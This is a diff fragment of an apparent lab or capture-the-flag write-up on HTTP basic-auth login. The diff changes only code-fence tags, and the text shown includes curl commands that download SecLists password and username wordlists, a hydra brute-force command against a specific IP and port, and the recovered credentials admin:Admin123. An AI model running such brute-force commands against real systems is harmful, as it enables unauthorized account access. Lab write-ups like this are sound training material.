@@ -6,12 +6,12 @@ You might find the following wordlists helpful in this engagement: [usernames.tx
 ## Questions
 1. What is the password for the basic auth login? **Answer: Admin123**
    - Download the 2 recommended wordlists:
-        ```sh
+        ```shellsession
         $ curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt
         $ curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Usernames/top-usernames-shortlist.txt
         ```
    - Run hydra with the basic HTTP authentication module → found `admin`:`Admin123`
-        ```sh
+        ```shellsession
         $ hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt 154.57.164.68 -s 31144 http-get /
         Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
